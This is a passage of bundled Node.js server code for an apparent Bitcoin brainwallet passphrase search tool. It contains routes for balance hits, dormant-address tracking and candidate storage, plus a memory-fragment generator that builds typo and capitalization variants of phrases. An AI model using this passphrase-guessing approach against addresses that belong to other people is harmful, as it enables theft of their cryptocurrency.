        recent: conversionRecords.slice(-10).map((r) => ({
          tier: r.tier,
          phi: r.phi,
          convertedAt: r.convertedAt,
          timeToConversionHours: r.timeToConversionHours,
          matchAddress: r.matchAddress
        }))
      },
      insights,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Near-Miss Success Rates] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
nearMissRouter.post("/conversion", generousLimiter, async (req, res) => {
  try {
    const { phrase, entryId, matchAddress } = req.body;
    let record;
    if (phrase) {
      record = nearMissManager.recordConversionByPhrase(phrase, matchAddress);
    } else if (entryId) {
      record = nearMissManager.recordConversion(entryId, matchAddress);
    } else {
      return res.status(400).json({ error: "Either phrase or entryId is required" });
    }
    if (!record) {
      return res.status(404).json({ error: "Near-miss entry not found" });
    }
    res.json({
      success: true,
      record,
      successRates: nearMissManager.getTierSuccessRates(),
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[Near-Miss Conversion] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
var attentionMetricsRouter = Router4();
attentionMetricsRouter.post("/validate", generousLimiter, async (req, res) => {
  try {
    const { samplesPerScale = 100 } = req.body;
    console.log(`[API] Starting \u03B2-attention validation with ${samplesPerScale} samples per scale...`);
    const result = runAttentionValidation(samplesPerScale);
    res.json({
      success: true,
      result,
      formatted: formatValidationResult(result)
    });
  } catch (error) {
    console.error("[API] \u03B2-attention validation error:", error);
    res.status(500).json({ error: error.message });
  }
});
attentionMetricsRouter.get("/physics-reference", generousLimiter, (req, res) => {
  res.json({
    success: true,
    physicsReference: attentionMetrics.PHYSICS_BETA,
    contextScales: attentionMetrics.CONTEXT_SCALES,
    description: {
      kappaStar: "Fixed point value from L=6 validation (frozen 2025-12-02)",
      emergence: "\u03B2 at emergence (L=3\u21924 equivalent) - strong running",
      approaching: "\u03B2 approaching plateau (L=4\u21925 equivalent)",
      fixedPoint: "\u03B2 at fixed point (L=5\u21926 equivalent) - asymptotic freedom",
      acceptanceThreshold: "Maximum allowed deviation for substrate independence validation"
    }
  });
});
var ucpRouter = Router4();
ucpRouter.get("/stats", async (req, res) => {
  try {
    const { oceanAgent: oceanAgent2 } = await Promise.resolve().then(() => (init_ocean_agent(), ocean_agent_exports));
    const ucpStats = oceanAgent2.getUCPStats();
    res.json({
      success: true,
      stats: ucpStats,
      modules: {
        temporalGeometry: ucpStats.trajectoryActive ? "active" : "inactive",
        negativeKnowledge: ucpStats.negativeKnowledge.contradictions > 0 ? "active" : "idle",
        knowledgeBus: ucpStats.knowledgeBus.published > 0 ? "active" : "idle",
        knowledgeCompression: ucpStats.compressionMetrics.generators > 0 ? "active" : "idle"
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// server/routes/balance.ts
init_replitAuth();
init_blockchain_scanner();
import { Router as Router5 } from "express";
import rateLimit2 from "express-rate-limit";

// server/address-verification.ts
init_blockchain_scanner();
init_crypto();
init_balance_queue();
init_blockchain_api_router();
var verifiedAddresses = /* @__PURE__ */ new Map();
var VERIFIED_ADDRESSES_FILE = "data/verified-addresses.json";
var BALANCE_ADDRESSES_FILE = "data/balance-addresses.json";
var TRANSACTION_ADDRESSES_FILE = "data/transaction-addresses.json";
async function saveStoredAddresses() {
  try {
    const fs19 = await import("fs/promises");
    await fs19.mkdir("data", { recursive: true });
    const allAddresses = Array.from(verifiedAddresses.values());
    await fs19.writeFile(
      VERIFIED_ADDRESSES_FILE,
      JSON.stringify(allAddresses, null, 2)
    );
    const balanceAddresses = allAddresses.filter((a) => a.hasBalance);
    await fs19.writeFile(
      BALANCE_ADDRESSES_FILE,
      JSON.stringify(balanceAddresses, null, 2)
    );
    const transactionAddresses = allAddresses.filter((a) => a.hasTransactions);
    await fs19.writeFile(
      TRANSACTION_ADDRESSES_FILE,
      JSON.stringify(transactionAddresses, null, 2)
    );
    console.log(`[AddressVerification] Saved ${allAddresses.length} addresses (${balanceAddresses.length} with balance, ${transactionAddresses.length} with transactions)`);
  } catch (error) {
    console.error("[AddressVerification] Error saving addresses:", error);
  }
}
async function loadStoredAddresses() {
  try {
    const fs19 = await import("fs/promises");
    const data = await fs19.readFile(VERIFIED_ADDRESSES_FILE, "utf-8");
    const addresses2 = JSON.parse(data);
    for (const addr of addresses2) {
      verifiedAddresses.set(addr.address, addr);
    }
    console.log(`[AddressVerification] Loaded ${addresses2.length} verified addresses from disk`);
  } catch {
    console.log("[AddressVerification] No previous verified addresses found");
  }
}
function getVerificationStats() {
  const all = Array.from(verifiedAddresses.values());
  return {
    total: all.length,
    withBalance: all.filter((a) => a.hasBalance).length,
    withTransactions: all.filter((a) => a.hasTransactions).length,
    matchedTargets: all.filter((a) => a.matchedTarget).length,
    totalBalance: all.reduce((sum, a) => sum + a.balanceSats, 0),
    totalBalanceBTC: (all.reduce((sum, a) => sum + a.balanceSats, 0) / 1e8).toFixed(8)
  };
}
function getBalanceAddresses() {
  return Array.from(verifiedAddresses.values()).filter((a) => a.hasBalance);
}
async function refreshStoredBalances() {
  const addresses2 = Array.from(verifiedAddresses.values());
  let checked = 0;
  let updated = 0;
  let newBalance = 0;
  console.log(`[AddressVerification] Refreshing balances for ${addresses2.length} addresses...`);
  for (const stored of addresses2) {
    try {
      const addressData = await getAddressData(stored.address);
      if (addressData) {
        checked++;
        const hadBalance = stored.hasBalance;
        const previousBalance = stored.balanceSats;
        if (addressData.balance !== previousBalance) {
          console.log(`[AddressVerification] Balance changed for ${stored.address}: ${previousBalance} \u2192 ${addressData.balance} sats`);
          stored.balanceSats = addressData.balance;
          stored.balanceBTC = (addressData.balance / 1e8).toFixed(8);
          stored.hasBalance = addressData.balance > 0;
          updated++;
          if (!hadBalance && addressData.balance > 0) {
            newBalance++;
          }
        }
        stored.txCount = addressData.txCount;
        stored.hasTransactions = addressData.txCount > 0;
        stored.lastChecked = (/* @__PURE__ */ new Date()).toISOString();
      }
      await new Promise((resolve) => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`[AddressVerification] Error refreshing ${stored.address}:`, error);
    }
  }
  if (updated > 0) {
    await saveStoredAddresses();
  }
  console.log(`[AddressVerification] Refresh complete: ${checked} checked, ${updated} updated, ${newBalance} new balances`);
  return { checked, updated, newBalance };
}
loadStoredAddresses();

// server/routes/balance.ts
init_balance_queue();
init_balance_queue_integration();
var standardLimiter = rateLimit2({
  windowMs: 60 * 1e3,
  max: 20,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var balanceRouter = Router5();
balanceRouter.get("/hits", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const activeOnly = req.query.active === "true";
    const hits = activeOnly ? getActiveBalanceHits() : getBalanceHits();
    const totalBalance = hits.reduce((sum, h) => sum + h.balanceSats, 0);
    res.json({
      hits,
      count: hits.length,
      activeCount: hits.filter((h) => h.balanceSats > 0).length,
      totalBalanceSats: totalBalance,
      totalBalanceBTC: (totalBalance / 1e8).toFixed(8)
    });
  } catch (error) {
    console.error("[BalanceHits] List error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.get("/hits/check/:address", standardLimiter, async (req, res) => {
  try {
    const address = req.params.address;
    if (!address.match(/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/) && !address.match(/^bc1[a-z0-9]{39,59}$/)) {
      return res.status(400).json({ error: "Invalid Bitcoin address format" });
    }
    const balance = await fetchAddressBalance(address);
    if (!balance) {
      return res.status(500).json({ error: "Failed to fetch balance from blockchain" });
    }
    res.json({
      address,
      balanceSats: balance.balanceSats,
      balanceBTC: (balance.balanceSats / 1e8).toFixed(8),
      txCount: balance.txCount,
      totalFunded: balance.funded,
      totalSpent: balance.spent
    });
  } catch (error) {
    console.error("[BalanceHits] Check error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.patch("/hits/:address/dormant", standardLimiter, async (req, res) => {
  try {
    const address = decodeURIComponent(req.params.address);
    const { isDormantConfirmed } = req.body;
    if (typeof isDormantConfirmed !== "boolean") {
      return res.status(400).json({ error: "isDormantConfirmed must be a boolean" });
    }
    const { db: db2 } = await Promise.resolve().then(() => (init_db(), db_exports));
    if (db2) {
      const { balanceHits: balanceHitsTable } = await Promise.resolve().then(() => (init_schema(), schema_exports));
      const { eq: eq9 } = await import("drizzle-orm");
      const result = await db2.update(balanceHitsTable).set({
        isDormantConfirmed,
        dormantConfirmedAt: isDormantConfirmed ? /* @__PURE__ */ new Date() : null,
        updatedAt: /* @__PURE__ */ new Date()
      }).where(eq9(balanceHitsTable.address, address)).returning();
      if (result.length === 0) {
        return res.status(404).json({ error: "Balance hit not found" });
      }
      res.json({
        success: true,
        address,
        isDormantConfirmed,
        dormantConfirmedAt: result[0].dormantConfirmedAt
      });
    } else {
      res.status(500).json({ error: "Database not available" });
    }
  } catch (error) {
    console.error("[BalanceHits] Dormant update error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.get("/addresses", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const balanceAddresses = getBalanceAddresses();
    const stats2 = getVerificationStats();
    res.json({
      addresses: balanceAddresses,
      count: balanceAddresses.length,
      stats: stats2
    });
  } catch (error) {
    console.error("[BalanceAddresses] List error:", error);
    res.json({
      addresses: [],
      count: 0,
      stats: { total: 0, withBalance: 0, withTransactions: 0 },
      initializing: true,
      error: error.message
    });
  }
});
balanceRouter.get("/addresses/stats", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const stats2 = getVerificationStats();
    res.json(stats2);
  } catch (error) {
    console.error("[BalanceAddresses] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.post("/addresses/refresh", isAuthenticated, standardLimiter, async (req, res) => {
  try {
    const result = await refreshStoredBalances();
    res.json(result);
  } catch (error) {
    console.error("[BalanceAddresses] Refresh error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.get("/queue/stats", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const queueStats = balanceQueue.getStats();
    const integrationStats = getQueueIntegrationStats();
    res.json({
      queue: queueStats,
      integration: integrationStats,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  } catch (error) {
    console.error("[BalanceQueue] Stats error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.get("/queue/pending", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const limit = parseInt(req.query.limit) || 100;
    const addresses2 = balanceQueue.getPendingAddresses(limit);
    res.json({
      addresses: addresses2,
      count: addresses2.length,
      stats: balanceQueue.getStats()
    });
  } catch (error) {
    console.error("[BalanceQueue] Pending error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.get("/queue/status", standardLimiter, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const status = balanceQueue.getBackgroundStatus();
    res.json({
      ...status,
      stats: balanceQueue.getStats()
    });
  } catch (error) {
    console.error("[BalanceQueue] Status error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.post("/queue/start", isAuthenticated, standardLimiter, async (req, res) => {
  try {
    balanceQueue.startBackgroundWorker();
    res.json({
      success: true,
      message: "Background worker started",
      status: balanceQueue.getBackgroundStatus()
    });
  } catch (error) {
    console.error("[BalanceQueue] Start error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.post("/queue/stop", isAuthenticated, standardLimiter, async (req, res) => {
  try {
    const stopped = balanceQueue.stopBackgroundWorker();
    res.json({
      success: stopped,
      message: stopped ? "Background worker stopped" : "Worker was not running",
      status: balanceQueue.getBackgroundStatus()
    });
  } catch (error) {
    console.error("[BalanceQueue] Stop error:", error);
    res.status(500).json({ error: error.message });
  }
});
balanceRouter.post("/queue/clear", isAuthenticated, standardLimiter, async (req, res) => {
  try {
    balanceQueue.clear();
    res.json({ success: true, message: "Queue cleared" });
  } catch (error) {
    console.error("[BalanceQueue] Clear error:", error);
    res.status(500).json({ error: error.message });
  }
});

// server/routes/search.ts
init_storage();
import { Router as Router6 } from "express";
import rateLimit3 from "express-rate-limit";
import { randomUUID as randomUUID6 } from "crypto";

// server/persistence/adapters/file-json-adapter.ts
import { readFileSync as readFileSync15, writeFileSync as writeFileSync14, existsSync as existsSync15, mkdirSync as mkdirSync13, renameSync as renameSync2, unlinkSync as unlinkSync3 } from "fs";
import { dirname as dirname10 } from "path";
var FileJsonAdapter = class {
  filePath;
  defaultValue;
  validate;
  onCorruption;
  cache = null;
  constructor(options) {
    this.filePath = options.filePath;
    this.defaultValue = options.defaultValue;
    this.validate = options.validate;
    this.onCorruption = options.onCorruption;
    this.ensureDirectory();
  }
  ensureDirectory() {
    const dir = dirname10(this.filePath);
    if (!existsSync15(dir)) {
      mkdirSync13(dir, { recursive: true });
    }
  }
  load() {
    if (this.cache !== null) {
      return this.cache;
    }
    try {
      if (!existsSync15(this.filePath)) {
        this.cache = this.defaultValue;
        return this.cache;
      }
      const data = readFileSync15(this.filePath, "utf-8").trim();
      if (data.length === 0) {
        this.cache = this.defaultValue;
        return this.cache;
      }
      const parsed = JSON.parse(data);
      this.cache = this.validate ? this.validate(parsed) : parsed;
      return this.cache;
    } catch (error) {
      console.error(`[FileJsonAdapter] Failed to load ${this.filePath}:`, error);
      if (existsSync15(this.filePath)) {
        const backupPath = `${this.filePath}.backup-${Date.now()}`;
        try {
          const corruptedData = readFileSync15(this.filePath, "utf-8");
          writeFileSync14(backupPath, corruptedData, "utf-8");
          console.log(`[FileJsonAdapter] Corrupted file backed up to: ${backupPath}`);
          this.onCorruption?.(error, backupPath);
        } catch (backupError) {
          console.error("[FileJsonAdapter] Failed to create backup:", backupError);
        }
      }
      this.cache = this.defaultValue;
      return this.cache;
    }
  }
  save(data) {
    this.cache = data;
    this.ensureDirectory();
    const tempFile = `${this.filePath}.tmp`;
    const jsonData = JSON.stringify(data, null, 2);
    try {
      writeFileSync14(tempFile, jsonData, "utf-8");
      try {
        const verifyData = readFileSync15(tempFile, "utf-8");
        JSON.parse(verifyData);
      } catch (verifyError) {
        unlinkSync3(tempFile);
        throw new Error(`Temp file verification failed: ${verifyError}`);
      }
      if (process.platform === "win32" && existsSync15(this.filePath)) {
        const backupFile = `${this.filePath}.backup-safe`;
        try {
          if (existsSync15(backupFile)) unlinkSync3(backupFile);
          renameSync2(this.filePath, backupFile);
          renameSync2(tempFile, this.filePath);
          const verifyNewFile = readFileSync15(this.filePath, "utf-8");
          JSON.parse(verifyNewFile);
          if (existsSync15(backupFile)) unlinkSync3(backupFile);
        } catch (winError) {
          console.error("Write failed, attempting rollback...");
          if (existsSync15(backupFile)) {
            if (existsSync15(this.filePath)) unlinkSync3(this.filePath);
            renameSync2(backupFile, this.filePath);
            console.log("Rollback successful - restored from backup");
          }
          throw winError;
        }
      } else {
        renameSync2(tempFile, this.filePath);
      }
    } catch (error) {
      console.error(`[FileJsonAdapter] Failed to save ${this.filePath}:`, error);
      throw error;
    }
  }
  update(updater) {
    const current = this.load();
    const updated = updater(current);
    this.save(updated);
  }
  invalidateCache() {
    this.cache = null;
  }
};

// server/persistence/adapters/candidate-json-adapter.ts
import { join as join15, dirname as dirname11 } from "path";
import { fileURLToPath as fileURLToPath3 } from "url";
var __filename3 = fileURLToPath3(import.meta.url);
var __dirname3 = dirname11(__filename3);
var CANDIDATES_FILE2 = join15(__dirname3, "../../../data/candidates.json");
function isCandidate(item) {
  return item !== null && typeof item === "object" && typeof item.id === "string" && typeof item.phrase === "string" && typeof item.address === "string" && typeof item.score === "number" && typeof item.testedAt === "string";
}
var CandidateJsonAdapter = class {
  adapter;
  maxCandidates;
  constructor(options) {
    this.maxCandidates = options?.maxCandidates ?? 100;
    this.adapter = new FileJsonAdapter({
      filePath: options?.filePath ?? CANDIDATES_FILE2,
      defaultValue: [],
      validate: (data) => {
        if (!Array.isArray(data)) {
          throw new Error("Candidates file is corrupted: expected array");
        }
        const valid = data.filter(isCandidate);
        if (valid.length < data.length) {
          console.warn(`[CandidateJsonAdapter] Skipped ${data.length - valid.length} invalid candidates`);
        }
        return valid;
      },
      onCorruption: (error, backupPath) => {
        console.error(`[CandidateJsonAdapter] Corrupted file backed up to: ${backupPath}`);
      }
    });
    const candidates = this.adapter.load();
    console.log(`[CandidateJsonAdapter] Loaded ${candidates.length} candidates`);
    const matches = candidates.filter((c) => c.score === 100);
    if (matches.length > 0) {
      console.log(`[CandidateJsonAdapter] RECOVERED ${matches.length} MATCH(ES) FROM DISK!`);
      matches.forEach((m) => {
        console.log(`[CandidateJsonAdapter]   - Address: ${m.address}, Type: ${m.type}`);
      });
    }
  }
  async getCandidates() {
    return [...this.adapter.load()].sort((a, b) => b.score - a.score);
  }
  async addCandidate(candidate) {
    this.adapter.update((candidates) => {
      const updated = [...candidates, candidate].sort((a, b) => b.score - a.score).slice(0, this.maxCandidates);
      return updated;
    });
    if (candidate.score === 100) {
      console.log(`[CandidateJsonAdapter] MATCH SAVED! Address: ${candidate.address}, Type: ${candidate.type}`);
    }
  }
  async clearCandidates() {
    this.adapter.save([]);
  }
};

// server/persistence/adapters/search-job-json-adapter.ts
import { join as join16, dirname as dirname12 } from "path";
import { fileURLToPath as fileURLToPath4 } from "url";
var __filename4 = fileURLToPath4(import.meta.url);
var __dirname4 = dirname12(__filename4);
var JOBS_FILE2 = join16(__dirname4, "../../../data/search-jobs.json");
var SearchJobJsonAdapter = class {
  adapter;
  constructor(options) {
    this.adapter = new FileJsonAdapter({
      filePath: options?.filePath ?? JOBS_FILE2,
      defaultValue: []
    });
  }
  async getSearchJobs() {
    return [...this.adapter.load()].sort(
      (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
    );
  }
  async getSearchJob(id) {
    const jobs = this.adapter.load();
    return jobs.find((j) => j.id === id) || null;
  }
  async addSearchJob(job) {
    this.adapter.update((jobs) => [...jobs, job]);
  }
  async updateSearchJob(id, updates) {
    this.adapter.update((jobs) => {
      const index2 = jobs.findIndex((j) => j.id === id);
      if (index2 === -1) return jobs;
      const current = jobs[index2];
      const updated = [...jobs];
      updated[index2] = {
        ...current,
        ...updates,
        progress: updates.progress ? { ...current.progress, ...updates.progress } : current.progress,
        stats: updates.stats ? { ...current.stats, ...updates.stats } : current.stats,
        logs: updates.logs || current.logs,
        updatedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
      return updated;
    });
  }
  async appendJobLog(id, log2) {
    this.adapter.update((jobs) => {
      const index2 = jobs.findIndex((j) => j.id === id);
      if (index2 === -1) return jobs;
      const updated = [...jobs];
      updated[index2] = {
        ...updated[index2],
        logs: [
          ...updated[index2].logs,
          { ...log2, timestamp: (/* @__PURE__ */ new Date()).toISOString() }
        ],
        updatedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
      return updated;
    });
  }
  async deleteSearchJob(id) {
    this.adapter.update((jobs) => jobs.filter((j) => j.id !== id));
  }
};

// server/persistence/facade.ts
init_storage();
init_ocean_persistence();
var StorageFacade = class {
  _candidates;
  _targetAddresses;
  _searchJobs;
  _users;
  _oceanProbes = null;
  _testedPhrases = null;
  _config;
  constructor(config) {
    this._config = {
      backend: config?.backend ?? "json",
      dataDir: config?.dataDir
    };
    if (this._config.backend === "json") {
      const candidatePath = this._config.dataDir ? `${this._config.dataDir}/candidates.json` : void 0;
      const jobsPath = this._config.dataDir ? `${this._config.dataDir}/search-jobs.json` : void 0;
      this._candidates = new CandidateJsonAdapter({ filePath: candidatePath });
      this._searchJobs = new SearchJobJsonAdapter({ filePath: jobsPath });
    } else {
      this._candidates = storage;
      this._searchJobs = storage;
    }
    this._targetAddresses = storage;
    this._users = storage;
    if (oceanPersistence.isPersistenceAvailable()) {
      this._oceanProbes = {
        insertProbes: (probes) => oceanPersistence.insertProbes(probes),
        queryProbesByPhiKappa: (range, limit) => oceanPersistence.queryProbesByPhiKappa(range, limit),
        queryProbesByRegime: (regime, limit) => oceanPersistence.queryProbesByRegime(regime, limit),
        getHighPhiProbes: (minPhi, limit) => oceanPersistence.getHighPhiProbes(minPhi, limit),
        getProbeCount: () => oceanPersistence.getProbeCount()
      };
      this._testedPhrases = {
        markTested: (phrase) => oceanPersistence.markTested(phrase),
        batchMarkTested: (phrases) => oceanPersistence.batchMarkTested(phrases),
        hasBeenTested: (phrase) => oceanPersistence.hasBeenTested(phrase),
        flushTestedPhrases: () => oceanPersistence.flushTestedPhrases()
      };
    }
    console.log(`[StorageFacade] Initialized with backend: ${this._config.backend}`);
  }
  get config() {
    return { ...this._config };
  }
  get candidates() {
    return this._candidates;
  }
  get targetAddresses() {
    return this._targetAddresses;
  }
  get searchJobs() {
    return this._searchJobs;
  }
  get users() {
    return this._users;
  }
  get oceanProbes() {
    return this._oceanProbes;
  }
  get testedPhrases() {
    return this._testedPhrases;
  }
  isOceanPersistenceAvailable() {
    return this._oceanProbes !== null;
  }
  getLegacyStorage() {
    return storage;
  }
};
var storageFacade = new StorageFacade({ backend: "json" });

// server/routes/search.ts
init_known_phrases();
init_bip39_words();
init_search_coordinator();
init_activity_log_store();
init_ocean_session_manager();

// server/memory-fragment-search.ts
init_qig_universal();
var QWERTY_NEIGHBORS = {
  "q": ["w", "a", "1", "2"],
  "w": ["q", "e", "a", "s", "d", "2", "3"],
  "e": ["w", "r", "s", "d", "f", "3", "4"],
  "r": ["e", "t", "d", "f", "g", "4", "5"],
  "t": ["r", "y", "f", "g", "h", "5", "6"],
  "y": ["t", "u", "g", "h", "j", "6", "7"],
  "u": ["y", "i", "h", "j", "k", "7", "8"],
  "i": ["u", "o", "j", "k", "l", "8", "9"],
  "o": ["i", "p", "k", "l", "9", "0"],
  "p": ["o", "l", "0"],
  "a": ["q", "w", "s", "z"],
  "s": ["a", "w", "e", "d", "x", "z"],
  "d": ["s", "e", "r", "f", "c", "x"],
  "f": ["d", "r", "t", "g", "v", "c"],
  "g": ["f", "t", "y", "h", "b", "v"],
  "h": ["g", "y", "u", "j", "n", "b"],
  "j": ["h", "u", "i", "k", "m", "n"],
  "k": ["j", "i", "o", "l", "m"],
  "l": ["k", "o", "p"],
  "z": ["a", "s", "x"],
  "x": ["z", "s", "d", "c"],
  "c": ["x", "d", "f", "v"],
  "v": ["c", "f", "g", "b"],
  "b": ["v", "g", "h", "n"],
  "n": ["b", "h", "j", "m"],
  "m": ["n", "j", "k"],
  "1": ["2", "q"],
  "2": ["1", "3", "q", "w"],
  "3": ["2", "4", "w", "e"],
  "4": ["3", "5", "e", "r"],
  "5": ["4", "6", "r", "t"],
  "6": ["5", "7", "t", "y"],
  "7": ["6", "8", "y", "u"],
  "8": ["7", "9", "u", "i"],
  "9": ["8", "0", "i", "o"],
  "0": ["9", "o", "p"]
};
function toggleCase(char) {
  if (char === char.toLowerCase()) {
    return char.toUpperCase();
  }
  return char.toLowerCase();
}
function getNearbyKey(char) {
  const lowerChar = char.toLowerCase();
  const neighbors = QWERTY_NEIGHBORS[lowerChar];
  if (!neighbors || neighbors.length === 0) return char;
  const neighbor = neighbors[Math.floor(Math.random() * neighbors.length)];
  return char === char.toUpperCase() ? neighbor.toUpperCase() : neighbor;
}
function mutateCharacterClass(char) {
  if (/[a-z]/i.test(char)) {
    const lowerChar = char.toLowerCase();
    const neighbors = QWERTY_NEIGHBORS[lowerChar];
    if (neighbors && neighbors.length > 0) {
      const letterNeighbors = neighbors.filter((n) => /[a-z]/i.test(n));
      if (letterNeighbors.length > 0) {
        const result = letterNeighbors[Math.floor(Math.random() * letterNeighbors.length)];
        return char === char.toUpperCase() ? result.toUpperCase() : result;
      }
    }
  } else if (/[0-9]/.test(char)) {
    const neighbors = QWERTY_NEIGHBORS[char];
    if (neighbors && neighbors.length > 0) {
      const digitNeighbors = neighbors.filter((n) => /[0-9]/.test(n));
      if (digitNeighbors.length > 0) {
        return digitNeighbors[Math.floor(Math.random() * digitNeighbors.length)];
      }
    }
  }
  return char;
}
function perturbArbitraryPhrase(phrase, strength) {
  const chars = phrase.split("");
  const mutations = Math.max(1, Math.floor(strength * chars.length));
  for (let i = 0; i < mutations; i++) {
    const idx = Math.floor(Math.random() * chars.length);
    const mutationType = Math.random();
    if (mutationType < 0.35) {
      chars[idx] = mutateCharacterClass(chars[idx]);
    } else if (mutationType < 0.6) {
      chars[idx] = toggleCase(chars[idx]);
    } else if (mutationType < 0.8) {
      const insertChar = getNearbyKey(chars[idx]);
      chars.splice(idx, 0, insertChar);
    } else {
      if (chars.length > 3) {
        chars.splice(idx, 1);
      }
    }
  }
  return chars.join("");
}
function generateCapitalizationVariants(phrase) {
  const variants = [
    phrase,
    phrase.toLowerCase(),
    phrase.toUpperCase()
  ];
  const words = phrase.split(/(\s+)/);
  variants.push(words.map(
    (w) => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
  ).join(""));
  if (phrase.match(/[a-z]/i)) {
    const camelCase = words.filter((w) => w.trim()).map(
      (w, i) => i === 0 ? w.toLowerCase() : w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
    ).join("");
    variants.push(camelCase);
    const pascalCase = words.filter((w) => w.trim()).map(
      (w) => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()
    ).join("");
    variants.push(pascalCase);
  }
  return Array.from(new Set(variants));
}
function generateSpacingVariants(phrase) {
  const words = phrase.split(/\s+/).filter((w) => w.length > 0);
  if (words.length <= 1) return [phrase];
  const variants = [
    phrase,
    words.join(""),
    words.join(" "),
    words.join("_"),
    words.join("-"),
    words.join(".")
  ];
  return Array.from(new Set(variants));
}
function generateAllVariants(phrase) {
  const spacingVariants = generateSpacingVariants(phrase);
  const allVariants = [];
  for (const spaced of spacingVariants) {
    const capVariants = generateCapitalizationVariants(spaced);
    allVariants.push(...capVariants);
  }
  return Array.from(new Set(allVariants));
}
function generateFragmentCandidates(fragments, maxCandidates = 1e4) {
  const candidates = [];
  const seen = /* @__PURE__ */ new Set();
  const sortedFragments = [...fragments].sort((a, b) => b.confidence - a.confidence);
  for (const f of sortedFragments) {
    for (const variant of generateAllVariants(f.text)) {
      if (!seen.has(variant)) {
        seen.add(variant);
        candidates.push({
          phrase: variant,
          confidence: f.confidence,
          fragments: [f.text]
        });
      }
    }
  }
  for (let i = 0; i < sortedFragments.length; i++) {
    const f1 = sortedFragments[i];
    for (let j = 0; j < sortedFragments.length; j++) {
      if (i === j) continue;
      const f2 = sortedFragments[j];
      const baseCombinations = [
        `${f1.text} ${f2.text}`,
        `${f1.text}${f2.text}`,
        `${f1.text}_${f2.text}`,
        `${f1.text}-${f2.text}`
      ];
      const combinedConfidence = f1.confidence * f2.confidence;
      for (const base of baseCombinations) {
        for (const variant of generateCapitalizationVariants(base)) {
          if (!seen.has(variant) && candidates.length < maxCandidates) {
            seen.add(variant);
            candidates.push({
              phrase: variant,
              confidence: combinedConfidence * (base.includes(" ") ? 1 : 0.95),
              fragments: [f1.text, f2.text]
            });
          }
        }
      }
    }
  }
  if (sortedFragments.length >= 3 && candidates.length < maxCandidates * 0.8) {
    for (let i = 0; i < Math.min(sortedFragments.length, 5); i++) {
      const f1 = sortedFragments[i];
      for (let j = 0; j < Math.min(sortedFragments.length, 5); j++) {
        if (i === j) continue;
        const f2 = sortedFragments[j];
        for (let k = 0; k < Math.min(sortedFragments.length, 5); k++) {
          if (k === i || k === j) continue;
          const f3 = sortedFragments[k];
          const combinations = [
            `${f1.text} ${f2.text} ${f3.text}`,
            `${f1.text}${f2.text}${f3.text}`
          ];
          const combinedConfidence = f1.confidence * f2.confidence * f3.confidence;
          for (const base of combinations) {
            if (!seen.has(base) && candidates.length < maxCandidates) {
              seen.add(base);
              candidates.push({
                phrase: base,
                confidence: combinedConfidence,
                fragments: [f1.text, f2.text, f3.text]
              });
            }
          }
        }
      }
    }
  }
  return candidates.slice(0, maxCandidates);
}
function scoreFragmentCandidates(candidates, _targetAddress) {
  const scored = candidates.map((c) => {
    const qigScore = scoreUniversalQIG(c.phrase, "arbitrary");
    const resonanceBonus = qigScore.inResonance ? 1.5 : 1;
    const regimeBonus = qigScore.regime === "geometric" ? 1.2 : qigScore.regime === "hierarchical" ? 1.1 : 1;
    const combinedScore = qigScore.phi * c.confidence * resonanceBonus * regimeBonus;
    return {
      ...c,
      qigScore,
      combinedScore
    };
  });
  scored.sort((a, b) => (b.combinedScore || 0) - (a.combinedScore || 0));
  return scored;
}
function generateTypoVariations(candidates, topN = 100, perturbationsPerCandidate = 5) {
  const topCandidates = candidates.slice(0, topN);
  const typoVariations = [];
  for (const candidate of topCandidates) {
    for (let i = 0; i < perturbationsPerCandidate; i++) {
      const strength = 0.1 + i * 0.05;
      const perturbed = perturbArbitraryPhrase(candidate.phrase, strength);
      if (perturbed !== candidate.phrase) {
        typoVariations.push({
          phrase: perturbed,
          confidence: candidate.confidence * (1 - strength * 0.3),
          fragments: candidate.fragments
        });
      }
    }
  }
  return typoVariations;
}
function runMemoryFragmentSearch(fragments, targetAddress, options = {}) {
  const {
    maxCandidates = 1e4,
    includeTypos = true,
    typoTopN = 100
  } = options;
  console.log(`[MemorySearch] Generating candidates from ${fragments.length} fragments...`);
  let candidates = generateFragmentCandidates(fragments, maxCandidates);
  console.log(`[MemorySearch] Generated ${candidates.length} base candidates`);
  console.log(`[MemorySearch] Scoring candidates with QIG...`);
  candidates = scoreFragmentCandidates(candidates, targetAddress);
  if (includeTypos) {
    console.log(`[MemorySearch] Generating typo variations for top ${typoTopN} candidates...`);
    const typos = generateTypoVariations(candidates, typoTopN);
    console.log(`[MemorySearch] Generated ${typos.length} typo variations`);
    const typosScored = scoreFragmentCandidates(typos, targetAddress);
    candidates = [...candidates, ...typosScored];
    candidates.sort((a, b) => (b.combinedScore || 0) - (a.combinedScore || 0));
